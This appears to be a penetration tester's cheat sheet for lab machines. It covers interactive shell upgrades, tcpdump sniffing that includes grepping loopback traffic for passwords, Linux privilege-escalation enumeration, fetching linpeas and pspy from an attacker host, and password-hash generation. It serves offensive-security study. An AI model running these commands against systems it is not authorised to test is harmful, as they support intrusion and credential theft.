
## Upgrade shell

python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
export SHELL=/bin/bash
export TERM=tmux-256color
stty rows 53 columns 189
reset

## tcpdump

sudo tcpdump -i tun0 src host 192.168.184.150 and port 4444
sudo tcpdump -i tun0 src host 192.168.184.150 and port dst 4444
sudo tcpdump -nvvvXi tun0 tcp port 8080
sudo tcpdump -i lo -A | grep "pass"
sudo tcpdump -i tun0 udp port 53
sudo tcpdump -i tun0 tcp port 443 and src host 192.168.x.y

## Enumeration manualy
id
cat /etc/passwd | grep sh$
ls -al /etc/shadow
ls -al /etc/passwd
cat /etc/issue
cat /etc/os-release
arch
uname -a
ss -ntpl
ip a
cat /etc/iptables/rules.v4
cat /etc/network/interfaces
ls -al /etc/cron*
cat /etc/crontab
ls -al /var/log/cron.log
ls -al /var/log/syslog
ls -al /home/*
env
find / -type f -writable $USER 2>/dev/null | grep -v '^/proc\|^/sys\|^/snap'
find / -type f -user $USER 2>/dev/null | grep -v '^/proc\|^/sys\|^/snap'

find / -type f -perm -o+w 2>/dev/null | grep -v '^/proc\|^/sys\|^/snap'
find / -type d -perm -o+w 2>/dev/null | grep -v '^/proc\|^/sys\|^/snap'
find / -type f -perm -u=s 2>/dev/null | grep -v '^/proc\|^/sys\|^/snap'

getcap / -r 2>/dev/null
dpkg -l | grep compiler
ls -al /

whoami & ip a & cat /home/$USER/local.txt

## Enumeration automatique

curl $KALI/linpeas.sh -o linpeas.sh
curl $KALI/pspy64 -o pspy64
watch -n 1 "ps -aux | grep pass"
while true; do sleep 1 && ps -aux | grep pass; done
top -u root -c => filter command=/bin/sh
sudo -l
get proof

whoami & ip a & cat /root/proof.txt

## Find all files containing a specific text

grep -Rnw '/path/to/somewhere/' -e 'pattern'
-r or -R is recursive ; use -R to search entirely
-n is line number, and
-w stands for match the whole word.
-l (lower-case L) can be added to just give the file name of matching files.
-e is the pattern used during the search

## generate a hash using the crypt algorithm

openssl passwd w00t
mkpasswd -m md5crypt

## Tmux

### Configure

cat ~/.tmux.conf
set -g history-limit 10000
set -g allow-rename off
set-window-option -g mode-keys vi
Save pane
:capture-pane -S -
:save-buffer /path/filename.txt
tmux capture-pane -pS - >> /path/filename.txt
